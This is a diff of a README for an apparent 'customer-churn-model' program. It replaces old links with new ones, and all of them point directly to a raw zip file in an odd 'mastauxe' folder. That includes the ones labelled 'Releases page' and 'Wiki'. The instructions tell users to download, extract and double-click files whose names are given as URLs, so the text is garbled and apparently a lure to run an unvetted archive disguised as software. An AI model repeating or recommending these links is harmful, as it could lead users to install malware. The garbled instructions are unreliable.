@@ -8,7 +8,7 @@ Welcome to the customer-churn-model! This software helps you predict if customer
 
 To get started, you need to download the software. Click the button below:
 
-[![Download Customer Churn Model](https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip%20Now-blue)](https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip)
+[![Download Customer Churn Model](https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip%20Now-blue)](https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip)
 
 After clicking the link, you will be taken to our Releases page where you can download the latest version. 
 
@@ -24,19 +24,19 @@ Before you download, make sure your computer meets the requirements:
 ## 🔗 Step-by-Step Installation Guide
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip). Here, you will find all available versions of the customer-churn-model.
+   Go to the [Releases page](https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip). Here, you will find all available versions of the customer-churn-model.
 
 2. **Select the Latest Version**  
    Look for the latest version on the page. It will typically be listed at the top.
 
 3. **Download the File**  
-   Click on the link that says "https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip" or "https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip" (depending on your operating system). This starts the download.
+   Click on the link that says "https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip" or "https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip" (depending on your operating system). This starts the download.
 
 4. **Extract the Files (if needed)**  
    If you downloaded a .zip file, right-click on it and select "Extract All." Follow the prompts to extract the files to a folder on your computer.
 
 5. **Open the Application**  
-   Navigate to the folder where you extracted the files. Look for "https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip" or "https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip". Double-click to open it.
+   Navigate to the folder where you extracted the files. Look for "https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip" or "https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip". Double-click to open it.
 
 ## 📈 Using the Software
 
@@ -68,12 +68,12 @@ If you run into issues while using the software, here are some common solutions:
 
 ## 🤝 Support
 
-If you need further help, reach out to us. You can open an issue on the GitHub repository or check the [Wiki](https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip) for more guides.
+If you need further help, reach out to us. You can open an issue on the GitHub repository or check the [Wiki](https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip) for more guides.
 
 ## 🌟 Conclusion
 
 You are now ready to predict customer churn using the customer-churn-model! This guide should help you download and run the application without any hassle. Enjoy exploring your data and making informed decisions! 
 
-Remember to revisit the [Releases page](https://raw.githubusercontent.com/Morssli/customer-churn-model/main/mastauxe/customer-churn-model.zip) for future updates.
+Remember to revisit the [Releases page](https://github.com/Morssli/customer-churn-model/raw/refs/heads/main/mastauxe/churn-model-customer-v1.3.zip) for future updates.
 
 Happy analyzing!
